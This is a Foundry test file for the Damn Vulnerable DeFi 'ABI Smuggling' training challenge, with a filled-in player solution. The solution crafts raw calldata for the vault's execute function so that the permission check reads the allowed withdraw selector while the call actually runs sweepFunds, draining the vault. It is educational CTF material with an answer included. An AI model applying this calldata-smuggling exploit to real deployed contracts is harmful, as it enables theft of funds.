// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {SelfAuthorizedVault, AuthorizedExecutor, IERC20} from "../../src/abi-smuggling/SelfAuthorizedVault.sol";

contract ABISmugglingChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address recovery = makeAddr("recovery");
    
    uint256 constant VAULT_TOKEN_BALANCE = 1_000_000e18;

    DamnValuableToken token;
    SelfAuthorizedVault vault;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);

        // Deploy token
        token = new DamnValuableToken();

        // Deploy vault
        vault = new SelfAuthorizedVault();

        // Set permissions in the vault
        bytes32 deployerPermission = vault.getActionId(hex"85fb709d", deployer, address(vault)); // sweepFunds
        bytes32 playerPermission = vault.getActionId(hex"d9caed12", player, address(vault)); // withdraw
        bytes32[] memory permissions = new bytes32[](2);
        permissions[0] = deployerPermission;
        permissions[1] = playerPermission;
        vault.setPermissions(permissions);

        // Fund the vault with tokens
        token.transfer(address(vault), VAULT_TOKEN_BALANCE);

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public {
        // Vault is initialized
        assertGt(vault.getLastWithdrawalTimestamp(), 0);
        assertTrue(vault.initialized());

        // Token balances are correct
        assertEq(token.balanceOf(address(vault)), VAULT_TOKEN_BALANCE);
        assertEq(token.balanceOf(player), 0);

        // Cannot call Vault directly
        vm.expectRevert(SelfAuthorizedVault.CallerNotAllowed.selector);
        vault.sweepFunds(deployer, IERC20(address(token)));
        vm.prank(player);
        vm.expectRevert(SelfAuthorizedVault.CallerNotAllowed.selector);
        vault.withdraw(address(token), player, 1e18);
    }

    /**
     * CODE YOUR SOLUTION HERE
     */

    function padAddress(address addr) public  returns (bytes32) {
        return bytes32(uint256(uint160(addr)));
    }

    function padData(bytes memory data) public returns (bytes memory newData){
        uint256 dataLength = data.length;
        uint256 requiredPad = 32 - dataLength%32;
        //console.log(requiredPad);
        if(requiredPad==32||requiredPad==0){
            requiredPad = 0;
        }
        uint256 newDataLength = dataLength + requiredPad;
        //console.log(newDataLength);

        newData = new bytes(newDataLength);
        for(uint256 i=0; i<dataLength; i++){
            newData[i] = data[i];
        }
    }


    function test_abiSmuggling() public checkSolvedByPlayer {
        //(token, recipient, amount);
        bytes memory actionData = abi.encodeWithSelector(vault.withdraw.selector, token,recovery,1 ether);
        //console.log(actionData);
        // execute 함수를 call을 통해 실행한다. with smuggling  (execute(address, bytes)) 
        // call 구조 : selector + paramInfo
        address targetAddr = address(vault);
        console.log(targetAddr);
        //console.logBytes(abi.encodeWithSignature("test(uint)", 1));

        bytes4 selector1 = vault.withdraw.selector;
        bytes4 selector2 = vault.sweepFunds.selector;
        uint256 dataOffset = 0x80;
        
        bytes memory payload = padData(abi.encodeWithSelector(selector2, recovery, IERC20(address(token)))); // Call sweepFunds
        //console.logBytes(payload);
        uint256 dataLength = payload.length;
        //console.log(dataLength);
        bytes4 executeSelector = vault.execute.selector;
        bytes28 padd = 0x0;

        console.logBytes(abi.encodeWithSelector(executeSelector, targetAddr, payload));
        

        // selector(4) + address(32 : 0x0) + offset(32 : 0x20) + length(32 : 0x40) + dummy(32 : 0x60) + payload
        bytes memory exploitPayload = abi.encodePacked(executeSelector,padAddress(targetAddr),dataOffset,uint256(0),selector1,padd,dataLength,payload); 
        console.logBytes(exploitPayload);
        address(vault).call(exploitPayload); // call execute
        
        
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // All tokens taken from the vault and deposited into the designated recovery account
        assertEq(token.balanceOf(address(vault)), 0, "Vault still has tokens");
        assertEq(token.balanceOf(recovery), VAULT_TOKEN_BALANCE, "Not enough tokens in recovery account");
    }
}
